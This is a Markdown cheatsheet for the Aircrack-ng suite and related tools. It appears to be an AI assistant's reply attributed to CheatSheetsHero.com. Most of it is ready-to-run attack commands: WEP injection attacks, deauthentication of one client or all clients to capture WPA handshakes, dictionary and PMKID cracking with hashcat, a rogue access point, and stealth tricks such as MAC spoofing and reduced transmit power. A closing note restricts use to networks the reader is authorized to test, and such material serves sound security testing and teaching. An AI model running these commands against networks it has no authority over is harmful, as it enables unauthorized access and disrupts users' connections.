        "content": "\n---\n\n# üì° **Aircrack-ng Suite Cheatsheet**  \n*A set of tools for assessing WiFi network security ‚Äì capturing, analyzing, and cracking WEP/WPA/WPA2 keys.*\n\n---\n\n## üîß **1. Interface Monitoring & Setup**\n\n| Command | Description |\n|--------|-------------|\n| `airmon-ng check` | Checks for interfering processes (e.g., NetworkManager). |\n| `sudo airmon-ng start wlan0` | Puts `wlan0` into monitor mode ‚Üí creates `wlan0mon`. |\n| `sudo airmon-ng stop wlan0mon` | Stops monitor mode. |\n| `sudo ifconfig wlan0 down/up` | Brings interface down or up. |\n| `sudo iwconfig wlan0 mode monitor` | Manually set interface to monitor mode. |\n| `macchanger -r wlan0` | Randomizes MAC address (run after `ifconfig down`). |\n\n> ‚úÖ **Tip**: Always run `airmon-ng check kill` to stop interfering processes before capture.\n\n---\n\n## üì° **2. Packet Capture with `airodump-ng`**\n\n| Command | Description |\n|--------|-------------|\n| `airodump-ng wlan0mon` | List all nearby networks (BSSID, ESSID, channel, clients). |\n| `airodump-ng -c 6 wlan0mon` | Capture on **channel 6** only. |\n| `airodump-ng -w capture wlan0mon` | Save packets to `capture-01.cap`, `.csv`, etc. |\n| `airodump-ng --bssid 00:11:22:33:44:55 -c 11 -w target wlan0mon` | Focus on specific AP. |\n| `airodump-ng --ignore-negative-one wlan0mon` | Suppress \"not associated\" warning. |\n| `airodump-ng --manufacturer wlan0mon` | Show device manufacturers. |\n\n> üîç **Look for**: WPA handshake message in top-right of `airodump-ng` output.\n\n---\n\n## üîì **3. WEP Cracking**\n\n### **Generate IVs (Initialization Vectors)**\n| Attack | Command |\n|-------|--------|\n| **ARP Replay** (needs client) | `aireplay-ng -3 -b <BSSID> wlan0mon` |\n| **Fragmentation** | `aireplay-ng -4 -b <BSSID> -h <CLIENT_MAC> wlan0mon` |\n| **Chopchop** | `aireplay-ng -5 -b <BSSID> -h <CLIENT_MAC> wlan0mon` |\n| **Interactive Replay** | `aireplay-ng -2 -p 0841 -c FF:FF:FF:FF:FF:FF -b <BSSID> -h <CLIENT_MAC> wlan0mon` |\n\n### **Crack WEP Key**\n```bash\naircrack-ng capture-01.cap\n# or faster PTW method:\naircrack-ng -z capture-01.cap\n```\n> üí° **Need ~10k‚Äì50k IVs** for reliable WEP crack.\n\n---\n\n## üîê **4. WPA/WPA2 Cracking**\n\n### **Capture Handshake**\n1. Start capture:  \n   ```bash\n   airodump-ng --bssid <BSSID> -c <CH> -w handshake wlan0mon\n   ```\n2. Force reconnect (deauth attack):  \n   ```bash\n   aireplay-ng -0 1 -a <BSSID> -c <CLIENT_MAC> wlan0mon  # single client\n   aireplay-ng -0 0 -a <BSSID> wlan0mon                  # broadcast (all clients)\n   ```\n3. Wait for ‚ÄúWPA handshake: [BSSID]‚Äù in `airodump-ng`.\n\n### **Crack with Dictionary**\n```bash\naircrack-ng -w /usr/share/wordlists/rockyou.txt -b <BSSID> handshake-01.cap\n```\n\n---\n\n## üåê **5. PMKID Attack (No Handshake Needed)**\n\n1. Capture PMKID:\n   ```bash\n   hcxdumptool -o capture.pcapng -i wlan0mon --enable_status=1\n   ```\n2. Convert to hash format:\n   ```bash\n   hcxpcaptool -z pmkid.16800 capture.pcapng\n   ```\n3. Crack with **Hashcat**:\n   ```bash\n   hashcat -m 16800 -a 0 pmkid.16800 rockyou.txt\n   ```\n\n> ‚úÖ Works on **WPA2/WPA3** if PMKID is broadcasted (common on many routers).\n\n---\n\n## üéØ **6. Advanced Tools**\n\n| Tool | Use Case |\n|------|--------|\n| `airbase-ng` | Create rogue AP: `airbase-ng -e \"FreeWiFi\" -c 6 wlan0mon` |\n| `packetforge-ng` | Forge custom packets for injection. |\n| `macchanger` | Spoof MAC to avoid detection. |\n| `iwconfig wlan0mon txpower 10` | Reduce transmission power to stay stealthy. |\n\n---\n\n## üìö **Common Wordlists**\n- `/usr/share/wordlists/rockyou.txt` (Kali Linux)\n- `SecLists` (GitHub)\n- Custom lists (e.g., based on target org name, dates, etc.)\n\n---\n\n> ‚ö†Ô∏è **Legal Note**: Use these tools **only on networks you own or have explicit permission to test**. Unauthorized access is illegal.\n\n---\n\nüìò **Source**: [CheatSheetsHero.com](https://cheatsheetshero.com)  \nüìÖ Page 1‚Äì3 of Aircrack-ng Cheatsheet\n\nLet me know if you'd like a **printable PDF version** or **command reference card**!"
